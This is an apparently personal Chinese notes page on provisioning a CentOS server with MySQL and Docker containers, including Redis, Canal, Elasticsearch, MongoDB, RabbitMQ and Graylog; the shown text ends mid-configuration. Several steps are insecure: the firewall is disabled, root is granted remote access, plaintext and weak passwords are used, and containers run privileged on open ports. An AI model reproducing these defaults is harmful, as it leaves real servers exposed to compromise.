<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 进入网络配置的目录</span></span><br><span class="line"><span class="built_in">cd</span> /etc/sysconfig/network-scripts/</span><br><span class="line">vi ifcfg-*</span><br><span class="line">BOOTPROTO=static</span><br><span class="line">IPADDR0=10.211.55.100</span><br><span class="line">PREFIX0=24</span><br><span class="line">NETMASK=255.255.255.0</span><br><span class="line">GATEWAY=10.211.55.1</span><br><span class="line">DNS1=119.29.29.29</span><br><span class="line"></span><br><span class="line">systemctl restart network.service</span><br><span class="line">systemctl <span class="built_in">disable</span> firewalld</span><br><span class="line"></span><br><span class="line"><span class="comment">#实际开发中不能关闭防火墙，而是开启某几个端口</span></span><br><span class="line">firewall-cmd --zone=public --add-port=4789/udp --permanent</span><br><span class="line">firewall-cmd --reload</span><br></pre></td></tr></table></figure>

<h2 id="安装mysql5-7"><a href="#安装mysql5-7" class="headerlink" title="安装mysql5.7"></a>安装mysql5.7</h2><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">wget https://dev.mysql.com/get/mysql57-community-release-el7-11.noarch.rpm</span><br><span class="line">yum localinstall mysql57-community-release-el7-11.noarch.rpm</span><br><span class="line">yum install -y mysql-community-server</span><br><span class="line">systemctl start mysqld</span><br><span class="line"><span class="meta">#</span><span class="language-bash">开机自启</span></span><br><span class="line">systemctl enable mysqld</span><br><span class="line"><span class="meta">#</span><span class="language-bash">重载所有修改过的配置文件</span></span><br><span class="line">systemctl daemon-reload</span><br><span class="line"></span><br><span class="line">grep &#x27;temporary password&#x27; /var/log/mysqld.log</span><br><span class="line"></span><br><span class="line">mysql -uroot -p</span><br><span class="line"></span><br><span class="line">ALTER USER &#x27;root&#x27;@&#x27;localhost&#x27; IDENTIFIED BY &#x27;Ycbaby000623.&#x27;; </span><br><span class="line">GRANT ALL PRIVILEGES ON *.* TO &#x27;root&#x27;@&#x27;%&#x27; IDENTIFIED BY &#x27;Ycbaby000623.&#x27; WITH GRANT OPTION;</span><br><span class="line"></span><br><span class="line">vi /etc/my.cnf</span><br><span class="line">[mysqld]</span><br><span class="line">character_set_server=utf8</span><br><span class="line">datadir=/var/lib/mysql</span><br><span class="line">server-id=1000</span><br><span class="line"></span><br><span class="line">default-time-zone=&#x27;+08:00&#x27;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">systemctl restart mysqld</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">chkconfig iptables off</span><br><span class="line">systemctl disable firewalld</span><br></pre></td></tr></table></figure>



<h2 id="Docker"><a href="#Docker" class="headerlink" title="Docker"></a>Docker</h2><h3 id="安装docker"><a href="#安装docker" class="headerlink" title="安装docker"></a>安装docker</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">yum install -y docker</span><br><span class="line">docker --version #出现版本号即为安装成功</span><br><span class="line">vi /etc/docker/daemon.json</span><br><span class="line"></span><br><span class="line">&#123;</span><br><span class="line">  &quot;registry-mirrors&quot;:[&quot;https://1nj0zren.mirror.aliyuncs.com&quot;,</span><br><span class="line">        &quot;https://docker.mirrors.ustc.edu.cn&quot;,</span><br><span class="line">        &quot;http://f1361db2.m.daocloud.io&quot;,</span><br><span class="line">        &quot;https://registry.docker-cn.com&quot;,</span><br><span class="line">                &quot;https://hub-mirror.c.163.com/&quot;],</span><br><span class="line">&quot;insecure-registries&quot;:[&quot;10.211.55.33:5000&quot;]</span><br><span class="line">&#125;</span><br><span class="line">systemctl restart docker.service</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h3 id="安装docker-compose"><a href="#安装docker-compose" class="headerlink" title="安装docker-compose"></a>安装docker-compose</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">#</span><span class="language-bash">方案一</span></span><br><span class="line">yum install docker-compose</span><br><span class="line"><span class="meta">#</span><span class="language-bash">方案二</span></span><br><span class="line">curl -L https://get.daocloud.io/docker/compose/releases/download/1.12.0/docker-compose-`uname -s`-`uname -m` &gt; /usr/local/bin/docker-compose</span><br><span class="line"></span><br><span class="line">chmod +x /usr/local/bin/docker-compose</span><br><span class="line"></span><br><span class="line">docker-compose version # 查看版本号，测试是否安装成功</span><br><span class="line">      </span><br></pre></td></tr></table></figure>

<h3 id="docker常用命令"><a href="#docker常用命令" class="headerlink" title="docker常用命令"></a>docker常用命令</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">service docker start  # 启动docker服务</span><br><span class="line">service docker stop  # 停止docker服务</span><br><span class="line">service docker restart  # 重启docker服务</span><br><span class="line">docker build # 构建镜像</span><br><span class="line">docker images # 查看镜像</span><br><span class="line">docker rmi # 删除镜像</span><br><span class="line">docker search # 到仓库搜索镜像</span><br><span class="line">docker push # 提交镜像到仓库</span><br><span class="line">docker pull # 从仓库拉取镜像</span><br><span class="line">docker save # 保存镜像</span><br><span class="line">docker load # 加载本地镜像</span><br><span class="line"></span><br><span class="line">docker run/exec/attach # 运行镜像、进入已经启动镜像</span><br><span class="line">docker stop # 停止镜像</span><br><span class="line">docker kill #stop用不了就用这个</span><br><span class="line">docker start # 启动镜像</span><br><span class="line">docker pause # 暂停镜像</span><br><span class="line">docker unpause # 恢复镜像</span><br><span class="line">docker ps # 查看运行中的镜像</span><br><span class="line">docker rm # 删除运行中的镜像</span><br><span class="line">docker inspect 容器id #查看容器信息</span><br><span class="line">docker logs -f canal #查看日志</span><br><span class="line">docker search centos #搜索</span><br><span class="line">docker tag centos test_centos2:171104 #打标签,这两个镜像使用的IMAGE ID是一样的，那它们其实就是同一个，不同的只是标签。</span><br><span class="line">docker run -itd centos #-i表示让容器的标准输入打开，-t表示分配一个伪终端，-d表示后台启动</span><br><span class="line">docker exec -it 79fab4540315 bash #进入容器</span><br><span class="line">Ctrl + d退出该容器</span><br><span class="line"> docker commit -m &quot;install net-tools and vim&quot; -a &quot;author&quot; 79fab4540315 test_centos</span><br><span class="line"><span class="meta"> #</span><span class="language-bash">docker commit创建镜像命令</span></span><br><span class="line"><span class="meta">#</span><span class="language-bash">-m指定该镜像的描述信息</span></span><br><span class="line"><span class="meta">#</span><span class="language-bash">-a指定镜像作者的信息</span></span><br><span class="line"><span class="meta">#</span><span class="language-bash">79fab4540315为该容器的<span class="built_in">id</span></span></span><br><span class="line"><span class="meta">#</span><span class="language-bash">test_centos则是生成的新镜像的名称</span></span><br><span class="line"><span class="meta">#</span><span class="language-bash">以上我们就通过容器创建了一个新的、由自己自定义环境的镜像，之后使用该镜像时，就不需要再去搭建环境了。而且我们可以把这个镜像放到一个仓库上，这样其他机器也可以下载。这就和集装箱一样，把东西都封装到一个箱子里，不仅方便移动，还可以开箱即用。</span></span><br><span class="line"></span><br><span class="line">docker save -o es6.5.1.tar 32f93c89076d</span><br><span class="line">docker load -i</span><br><span class="line">docker-compose up -d  # -d是丢到后台运行</span><br><span class="line">docker-compose stop #停止已有容器</span><br><span class="line">docker-compose start #启动已有容器</span><br><span class="line">docker-compose ps # 查看容器状态</span><br><span class="line">docker-compose rm -f #删除容器</span><br><span class="line">docker-compose down #停止并删除运行中的容器</span><br><span class="line"></span><br><span class="line">docker network ls #查看网络</span><br><span class="line"></span><br><span class="line">zip -q -r 压缩包名.zip   目录/文件名</span><br><span class="line">unzip 压缩包名</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112212149304.png" alt="image-20210322101411636"></p>
<h3 id="Docker设置开机自启功"><a href="#Docker设置开机自启功" class="headerlink" title="Docker设置开机自启功"></a>Docker设置开机自启功</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">#</span><span class="language-bash">docker自启动</span></span><br><span class="line">systemctl enable docker</span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta">#</span><span class="language-bash">容器启动后</span></span><br><span class="line">docker update --restart=always canal</span><br><span class="line"><span class="meta">#</span><span class="language-bash">容器启动时</span></span><br><span class="line">加 --restart=always</span><br></pre></td></tr></table></figure>

<h3 id="docker出现IPv4-forwarding-is-disabled-Networking-will-not-work解决方法"><a href="#docker出现IPv4-forwarding-is-disabled-Networking-will-not-work解决方法" class="headerlink" title="docker出现IPv4 forwarding is disabled. Networking will not work解决方法"></a>docker出现IPv4 forwarding is disabled. Networking will not work解决方法</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">#</span><span class="language-bash">修改内核参数</span></span><br><span class="line">vi /etc/sysctl.conf</span><br><span class="line">net.ipv4.ip_forward=0</span><br><span class="line">改成</span><br><span class="line">net.ipv4.ip_forward=1</span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta">#</span><span class="language-bash">重启network服务</span></span><br><span class="line">systemctl restart network</span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta">#</span><span class="language-bash">重启docker服务(这一步最重要,如果没有执行的话,还是会报错的)</span></span><br><span class="line">systemctl restart docker</span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta">#</span><span class="language-bash">重启iptables</span></span><br><span class="line">systemctl restart iptables</span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta">#</span><span class="language-bash">重启docker</span></span><br><span class="line">systemctl restart docker</span><br></pre></td></tr></table></figure>

<h3 id="Docker-安装redis-可"><a href="#Docker-安装redis-可" class="headerlink" title="Docker 安装redis 可"></a>Docker 安装redis 可</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">useradd leyou</span><br><span class="line">passwd leyou</span><br><span class="line">docker pull redis</span><br><span class="line"></span><br><span class="line">cd /home/leyou</span><br><span class="line">mkdir redis</span><br><span class="line">cd redis</span><br><span class="line">touch redis.conf #创建文件</span><br><span class="line">vi redis.conf</span><br><span class="line">databases 1</span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta">#</span><span class="language-bash"><span class="variable">$PWD</span>/redis.conf:/usr/local/etc/redis/redis.conf 将当前目录下的redis.conf与后面那个整合</span></span><br><span class="line">docker run \</span><br><span class="line"> -p 6379:6379 \</span><br><span class="line"> --name ly-redis \</span><br><span class="line"> -v  $PWD/redis.conf:/usr/local/etc/redis/redis.conf \</span><br><span class="line"> --privileged \</span><br><span class="line"> -d \</span><br><span class="line"> redis</span><br></pre></td></tr></table></figure>

<h3 id="docker安装mysql-可"><a href="#docker安装mysql-可" class="headerlink" title="docker安装mysql 可"></a>docker安装mysql 可</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">useradd leyou</span><br><span class="line">passwd leyou</span><br><span class="line"></span><br><span class="line">docker pull mysql:5.7.25</span><br><span class="line">cd /home/leyou</span><br><span class="line">mkdir mysql</span><br><span class="line">cd mysql</span><br><span class="line"><span class="meta">#</span><span class="language-bash">-v <span class="variable">$PWD</span>/conf:/etc/mysql/conf.d：是将当前目录的conf目录与docker容器中的/etc/mysql/conf.d目录绑定，可以自己指定配置文件</span></span><br><span class="line">docker run \</span><br><span class="line"> -p 3306:3306 \</span><br><span class="line"> --name mysql \</span><br><span class="line"> -v $PWD/conf:/etc/mysql/conf.d \</span><br><span class="line"> -v $PWD/logs:/logs \</span><br><span class="line"> -v $PWD/data:/var/lib/mysql \</span><br><span class="line"> -e MYSQL_ROOT_PASSWORD=123 \</span><br><span class="line"> --privileged \</span><br><span class="line"> -d \</span><br><span class="line"> mysql:5.7.25</span><br><span class="line"> </span><br><span class="line"><span class="meta"> </span></span><br><span class="line"><span class="meta"> # </span><span class="language-bash">12.15</span></span><br><span class="line"> docker run \</span><br><span class="line"> -p 3306:3306 \</span><br><span class="line"> --name mysql \</span><br><span class="line"> -v $PWD/conf:/etc/mysql/conf.d \</span><br><span class="line"> -v $PWD/logs:/logs \</span><br><span class="line"> -v $PWD/data:/var/lib/mysql \</span><br><span class="line"> -e MYSQL_ROOT_PASSWORD=ycbaby0623 \</span><br><span class="line"> --privileged \</span><br><span class="line"> -d \</span><br><span class="line"> mysql:5.7.25</span><br></pre></td></tr></table></figure>

<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">cd conf</span><br><span class="line">vi my.cnf</span><br><span class="line"></span><br><span class="line">[mysqld]</span><br><span class="line">character_set_server=utf8</span><br><span class="line">datadir=/var/lib/mysql</span><br><span class="line">server-id=1000</span><br><span class="line">default-time-zone=&#x27;+08:00&#x27;</span><br><span class="line"></span><br><span class="line">docker restart mysql</span><br></pre></td></tr></table></figure>

<h4 id="远程无法访问的问题"><a href="#远程无法访问的问题" class="headerlink" title="远程无法访问的问题"></a>远程无法访问的问题</h4><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">yum install iptables-services</span><br><span class="line">systemctl enable iptables</span><br><span class="line">service iptables save</span><br></pre></td></tr></table></figure>

<h4 id="iptables-–wait-t-filter-A-DOCKER-i-docker0-o-docker0-p-tcp-d-172-17-0-2-–dport-3306-j-ACCEPT-iptables-No-chain-x2F-target-x2F-match-by-that-name"><a href="#iptables-–wait-t-filter-A-DOCKER-i-docker0-o-docker0-p-tcp-d-172-17-0-2-–dport-3306-j-ACCEPT-iptables-No-chain-x2F-target-x2F-match-by-that-name" class="headerlink" title="iptables –wait -t filter -A DOCKER ! -i docker0 -o docker0 -p tcp -d 172.17.0.2 –dport 3306 -j ACCEPT: iptables: No chain&#x2F;target&#x2F;match by that name."></a>iptables –wait -t filter -A DOCKER ! -i docker0 -o docker0 -p tcp -d 172.17.0.2 –dport 3306 -j ACCEPT: iptables: No chain&#x2F;target&#x2F;match by that name.</h4><p>iptables -t filter -N DOCKER</p>
<h4 id="MySQL时区"><a href="#MySQL时区" class="headerlink" title="MySQL时区"></a>MySQL时区</h4><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta"># </span><span class="language-bash">方案一：这种修改在重启数据库后，会恢复成默认时区</span></span><br><span class="line">VARIABLES like &#x27;%time_zone%&#x27;;</span><br><span class="line">set time_zone=&#x27;+8:00&#x27;;</span><br><span class="line">flush privileges;</span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta"># </span><span class="language-bash">方案二：用这种</span></span><br><span class="line">serverTimezone=GMT%2B8</span><br><span class="line">spring.datasource.url: jdbc:mysql://localhost:3306/springboot_demo?serverTimezone=GMT%2B8&amp;useUnicode=true&amp;characterEncoding=UTF-8</span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta"># </span><span class="language-bash">方案三 实测有效</span></span><br><span class="line">vi  /etc/mysql/my.cnf</span><br><span class="line"><span class="meta">#</span><span class="language-bash">增加参数</span></span><br><span class="line">default-time-zone=&#x27;+08:00&#x27;</span><br></pre></td></tr></table></figure>

<h3 id="docker-安装-canal-Y"><a href="#docker-安装-canal-Y" class="headerlink" title="docker 安装 canal Y"></a>docker 安装 canal Y</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">#</span><span class="language-bash">设置bin <span class="built_in">log</span></span></span><br><span class="line">cd conf</span><br><span class="line">vi my.cnf</span><br><span class="line"></span><br><span class="line">[mysqld]</span><br><span class="line">character_set_server=utf8</span><br><span class="line">datadir=/var/lib/mysql</span><br><span class="line"><span class="meta">#</span><span class="language-bash">设置当前服务的<span class="built_in">id</span></span></span><br><span class="line">server-id=1000</span><br><span class="line"><span class="meta">#</span><span class="language-bash">设置binary <span class="built_in">log</span>文件的存放地址</span></span><br><span class="line">log-bin=/var/lib/mysql/mysql-bin</span><br><span class="line"><span class="meta">#</span><span class="language-bash">设置生成binary <span class="built_in">log</span>的database名称</span></span><br><span class="line">binlog-do-db=leyou</span><br><span class="line">default-time-zone=&#x27;+08:00&#x27;</span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta">#</span><span class="language-bash">设置权限</span></span><br><span class="line"><span class="meta">#</span><span class="language-bash">添加一个仅用于数据同步的账户，出于安全考虑，这里仅提供对leyou这个库的操作权限。</span></span><br><span class="line">create user canal@&#x27;%&#x27; IDENTIFIED by &#x27;canal&#x27;;</span><br><span class="line">GRANT SELECT, REPLICATION SLAVE, REPLICATION CLIENT,SUPER ON *.* TO &#x27;canal&#x27;@&#x27;%&#x27; identified by &#x27;canal&#x27;;</span><br><span class="line">FLUSH PRIVILEGES;</span><br><span class="line"></span><br><span class="line">docker restart mysql</span><br><span class="line"><span class="meta">#</span><span class="language-bash">在navicat中输入</span></span><br><span class="line">show master status;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">docker pull canal/canal-server</span><br><span class="line"><span class="meta">#</span><span class="language-bash">据库地址和端口，如果不知道mysql容器地址，可以通过docker inspect 容器<span class="built_in">id</span>来查看</span></span><br><span class="line"><span class="meta">#</span><span class="language-bash"></span></span><br><span class="line"><span class="language-bash">docker run -p 11111:11111 --name canal \</span></span><br><span class="line"><span class="language-bash">-e canal.destinations=<span class="built_in">test</span> \</span></span><br><span class="line"><span class="language-bash">-e canal.instance.master.address=172.17.0.3:3306  \</span></span><br><span class="line"><span class="language-bash">-e canal.instance.dbUsername=canal  \</span></span><br><span class="line"><span class="language-bash">-e canal.instance.dbPassword=canal  \</span></span><br><span class="line"><span class="language-bash">-e canal.instance.connectionCharset=UTF-8 \</span></span><br><span class="line"><span class="language-bash">-e canal.instance.tsdb.enable=<span class="literal">true</span> \</span></span><br><span class="line"><span class="language-bash">-e canal.instance.gtidon=<span class="literal">false</span>  \</span></span><br><span class="line"><span class="language-bash">-e canal.instance.filter.regex=leyou.tb_spu,leyou.tb_sku,leyou.tb_spu_detail,leyou.tb_category,leyou.tb_brand,leyou.tb_spec_param \</span></span><br><span class="line"><span class="language-bash">-d canal/canal-server</span></span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta">#</span><span class="language-bash">自启动</span></span><br><span class="line">docker update --restart=always canal</span><br></pre></td></tr></table></figure>

<p>表名称监听支持的语法：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">mysql 数据解析关注的表，Perl正则表达式.</span><br><span class="line">多个正则之间以逗号(,)分隔，转义符需要双斜杠(\\) </span><br><span class="line">常见例子：</span><br><span class="line">1.  所有表：.*   or  .*\\..*</span><br><span class="line">2.  canal schema下所有表： canal\\..*</span><br><span class="line">3.  canal下的以canal打头的表：canal\\.canal.*</span><br><span class="line">4.  canal schema下的一张表：canal.test1</span><br><span class="line">5.  多个规则组合使用然后以逗号隔开：canal\\..*,mysql.test1,mysql.test2 </span><br></pre></td></tr></table></figure>

<h3 id="docker安装es7"><a href="#docker安装es7" class="headerlink" title="docker安装es7"></a>docker安装es7</h3><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">docker pull docker.elastic.co/elasticsearch/elasticsearch:7.4.2 <span class="comment">#下载es7</span></span><br><span class="line">docker tag docker.elastic.co/elasticsearch/elasticsearch:7.4.2 es7 <span class="comment">#重命名</span></span><br><span class="line"></span><br><span class="line">docker run --name leyou-es \</span><br><span class="line">    -e <span class="string">&quot;cluster.name=leyou-elastic&quot;</span> \</span><br><span class="line">    -e <span class="string">&quot;http.host=0.0.0.0&quot;</span> \</span><br><span class="line">    -e <span class="string">&quot;ES_JAVA_OPTS=-Xms256m -Xmx512m&quot;</span> \</span><br><span class="line">    -e <span class="string">&quot;discovery.type=single-node&quot;</span> \</span><br><span class="line">    -v es-data:/usr/share/elasticsearch/data \</span><br><span class="line">    -v es-logs:/usr/share/elasticsearch/logs \</span><br><span class="line">    -v es-plugins:/usr/share/elasticsearch/plugins \</span><br><span class="line">    --privileged \</span><br><span class="line">    -p 9200:9200 \</span><br><span class="line">    -p 9300:9300 \</span><br><span class="line">    -d \</span><br><span class="line">    es7</span><br></pre></td></tr></table></figure>

<p>命令解释：</p>
<ul>
<li><code>-e &quot;cluster.name=es-docker-cluster&quot;</code>：设置集群名称</li>
<li><code>-e &quot;http.host=0.0.0.0&quot;</code>：监听的地址，可以外网访问</li>
<li><code>-e &quot;ES_JAVA_OPTS=-Xms256m -Xmx256m&quot;</code>：内存大小</li>
<li><code>-e &quot;discovery.type=single-node&quot;</code>：非集群模式</li>
<li><code>-v es-data:/usr/share/elasticsearch/data</code>：挂载逻辑卷，绑定es的数据目录</li>
<li><code>-v es-logs:/usr/share/elasticsearch/logs</code>：挂载逻辑卷，绑定es的日志目录</li>
<li><code>-v es-plugins:/usr/share/elasticsearch/plugins</code>：挂载逻辑卷，绑定es的插件目录</li>
<li><code>--privileged</code>：授予逻辑卷访问权</li>
<li><code>-p 9200:9200</code>：端口映射配置</li>
</ul>
<p>尝试在浏览器访问：<a href="http://192.168.150.101:9200查看效果：">http://192.168.150.101:9200查看效果：</a></p>
<p>安装分词器和拼音</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">docker volume inspect es-plugins</span><br></pre></td></tr></table></figure>

<p>把py和ik移动到对应目录下,然后重启es</p>
<h3 id="docker安装logstash"><a href="#docker安装logstash" class="headerlink" title="docker安装logstash"></a>docker安装logstash</h3><h3 id="docker-安装kibana"><a href="#docker-安装kibana" class="headerlink" title="docker 安装kibana"></a>docker 安装kibana</h3><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">docker <span class="built_in">exec</span> -it kibana容器<span class="built_in">id</span> /bin/bash</span><br><span class="line"><span class="built_in">cd</span> config</span><br><span class="line">vi kibana.yml</span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment"># ** THIS IS AN AUTO-GENERATED FILE **</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment"># Default Kibana configuration for docker target</span></span><br><span class="line">server.name: kibana</span><br><span class="line">server.host: <span class="string">&quot;0&quot;</span></span><br><span class="line">elasticsearch.hosts: [ <span class="string">&quot;http://elasticsearch:9200&quot;</span> ]</span><br><span class="line">xpack.monitoring.ui.container.elasticsearch.enabled: <span class="literal">true</span></span><br><span class="line">elasticsearch.ssl.verify: <span class="literal">false</span></span><br></pre></td></tr></table></figure>

<h3 id="docker安装mongo-可"><a href="#docker安装mongo-可" class="headerlink" title="docker安装mongo 可"></a>docker安装mongo 可</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">docker pull mongo</span><br><span class="line"></span><br><span class="line">docker run  \</span><br><span class="line">--name leyou-mongo \</span><br><span class="line">--restart=always \</span><br><span class="line">-e MONGO_INITDB_ROOT_USERNAME=root \</span><br><span class="line">-e MONGO_INITDB_ROOT_PASSWORD=root123 \</span><br><span class="line">-p 27017:27017  \</span><br><span class="line">-v mongo-config:/data/configdb/ \</span><br><span class="line">-v mongo-db:/data/db/ \</span><br><span class="line">--privileged \</span><br><span class="line">-d \</span><br><span class="line">mongo</span><br></pre></td></tr></table></figure>

<p>参数说明：</p>
<ul>
<li><code>--name</code>：指定容器名称为 leyou-mongo</li>
<li><code>-p</code> : 指定映射端口27017</li>
<li><code>-v</code> ：指定要挂载的逻辑卷，<ul>
<li><code>mongo-config</code>对应mongo的配置目录</li>
<li><code>mongo-db</code>对应数据目录</li>
</ul>
</li>
<li><code>-- privileged</code> : 授权访问挂载卷</li>
<li><code>-d</code> : 后台运行</li>
<li><code>mongo</code> : 镜像名称</li>
<li><code>- e</code> : 环境变量<ul>
<li><code>MONGO_INITDB_ROOT_USERNAME</code>：默认用户名设置</li>
<li><code>MONGO_INITDB_ROOT_PASSWORD</code>：默认密码设置</li>
</ul>
</li>
</ul>
<p>已管理员身份进入容器:</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">docker <span class="built_in">exec</span> -it leyou-mongo mongo admin</span><br><span class="line">use admin</span><br><span class="line">db.auth(<span class="string">&quot;root&quot;</span>,<span class="string">&quot;root123&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#如果初始化时没指定root用户</span></span><br><span class="line">db.createUser(&#123; </span><br><span class="line">  user: <span class="string">&#x27;root&#x27;</span>, </span><br><span class="line">  <span class="built_in">pwd</span>: <span class="string">&#x27;root123&#x27;</span>, </span><br><span class="line">  roles: [ &#123; role: <span class="string">&quot;userAdminAnyDatabase&quot;</span>, db: <span class="string">&quot;admin&quot;</span> &#125; ] </span><br><span class="line">  &#125;);</span><br><span class="line">  </span><br><span class="line"></span><br><span class="line">use carts</span><br><span class="line"></span><br><span class="line">db.createUser(&#123; user: <span class="string">&#x27;leyou&#x27;</span>, <span class="built_in">pwd</span>: <span class="string">&#x27;123&#x27;</span>, roles: [ &#123; role: <span class="string">&quot;readWrite&quot;</span>, db: <span class="string">&quot;carts&quot;</span> &#125; ] &#125;);</span><br></pre></td></tr></table></figure>

<h3 id="docker安装mongo-express-N"><a href="#docker安装mongo-express-N" class="headerlink" title="docker安装mongo-express N"></a>docker安装mongo-express N</h3><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">docker pull mongo-express</span><br><span class="line"><span class="comment">#8081</span></span><br><span class="line">docker run --name leyou-express \</span><br><span class="line"> --restart=always \</span><br><span class="line"> -e ME_CONFIG_MONGODB_ADMINUSERNAME=root \</span><br><span class="line"> -e ME_CONFIG_MONGODB_ADMINPASSWORD=root123 \</span><br><span class="line"> --<span class="built_in">link</span> leyou-mongo:mongo \</span><br><span class="line"> -p 8081:8081 \</span><br><span class="line"> -d \</span><br><span class="line"> mongo-express</span><br><span class="line"> </span><br><span class="line"></span><br></pre></td></tr></table></figure>


<h3 id="docker安装rabbitmq"><a href="#docker安装rabbitmq" class="headerlink" title="docker安装rabbitmq"></a>docker安装rabbitmq</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">docker pull rabbitmq:management</span><br><span class="line">docker run \</span><br><span class="line"> -e RABBITMQ_DEFAULT_USER=leyou \</span><br><span class="line"> -e RABBITMQ_DEFAULT_PASS=123321 \</span><br><span class="line"> --name ly-mq \</span><br><span class="line"> --hostname mq1 \</span><br><span class="line"> -p 15672:15672 \</span><br><span class="line"> -p 5672:5672 \</span><br><span class="line"> -d \</span><br><span class="line"> rabbitmq:3-management</span><br></pre></td></tr></table></figure>

<h3 id="docker-安装graylog4-1"><a href="#docker-安装graylog4-1" class="headerlink" title="docker 安装graylog4.1"></a>docker 安装graylog4.1</h3><figure class="highlight yml"><table><tr><td class="code"><pre><span class="line"><span class="string">mkdir</span> <span class="string">/usr/local/graylog</span>      <span class="comment">#创建graylog文件夹</span></span><br><span class="line"><span class="string">cd</span> <span class="string">/usr/local/graylog</span>      </span><br><span class="line"><span class="string">vi</span> <span class="string">docker-compose.yml</span>        <span class="comment">#编辑docker-compose.yml</span></span><br><span class="line"></span><br><span class="line"><span class="attr">version:</span> <span class="string">&#x27;3&#x27;</span></span><br><span class="line"><span class="attr">services:</span></span><br><span class="line">  <span class="comment"># MongoDB: https://hub.docker.com/_/mongo/</span></span><br><span class="line">  <span class="attr">mongo:</span></span><br><span class="line">    <span class="attr">image:</span> <span class="string">mongo:4.2</span></span><br><span class="line">    <span class="attr">ports:</span></span><br><span class="line">      <span class="bullet">-</span> <span class="number">27017</span><span class="string">:27017</span></span><br><span class="line">    <span class="attr">networks:</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">graylog</span></span><br><span class="line">  <span class="comment"># Elasticsearch: https://www.elastic.co/guide/en/elasticsearch/reference/7.10/docker.html</span></span><br><span class="line">  <span class="attr">elasticsearch:</span></span><br><span class="line">    <span class="attr">image:</span> <span class="string">docker.elastic.co/elasticsearch/elasticsearch-oss:7.10.2</span></span><br><span class="line">    <span class="attr">environment:</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">http.host=0.0.0.0</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">transport.host=localhost</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">network.host=0.0.0.0</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">&quot;ES_JAVA_OPTS=-Xms512m -Xmx512m&quot;</span></span><br><span class="line">    <span class="attr">ulimits:</span></span><br><span class="line">      <span class="attr">memlock:</span></span><br><span class="line">        <span class="attr">soft:</span> <span class="number">-1</span></span><br><span class="line">        <span class="attr">hard:</span> <span class="number">-1</span></span><br><span class="line">    <span class="attr">deploy:</span></span><br><span class="line">      <span class="attr">resources:</span></span><br><span class="line">        <span class="attr">limits:</span></span><br><span class="line">          <span class="attr">memory:</span> <span class="string">1g</span></span><br><span class="line">    <span class="attr">networks:</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">graylog</span></span><br><span class="line">    <span class="attr">ports:</span></span><br><span class="line">      <span class="bullet">-</span> <span class="number">9200</span><span class="string">:9200</span></span><br><span class="line">      <span class="bullet">-</span> <span class="number">9300</span><span class="string">:9300</span></span><br><span class="line">  <span class="comment"># Graylog: https://hub.docker.com/r/graylog/graylog/</span></span><br><span class="line">  <span class="attr">graylog:</span></span><br><span class="line">    <span class="attr">image:</span> <span class="string">graylog/graylog:4.1</span></span><br><span class="line">    <span class="attr">environment:</span></span><br><span class="line">      <span class="comment"># CHANGE ME (must be at least 16 characters)!</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">GRAYLOG_ROOT_TIMEZONE=Asia/Shanghai</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">GRAYLOG_PASSWORD_SECRET=somepasswordpepper</span></span><br><span class="line">      <span class="comment"># Password: admin</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">GRAYLOG_ROOT_PASSWORD_SHA2=8c6976e5b5410415bde908bd4dee15dfb167a9c873fc4bb8a81f6f2ab448a918</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">GRAYLOG_HTTP_EXTERNAL_URI=http://106.14.29.182:9000/</span></span><br><span class="line">    <span class="attr">entrypoint:</span> <span class="string">/usr/bin/tini</span> <span class="string">--</span> <span class="string">wait-for-it</span> <span class="string">elasticsearch:9200</span> <span class="string">--</span>  <span class="string">/docker-entrypoint.sh</span></span><br><span class="line">    <span 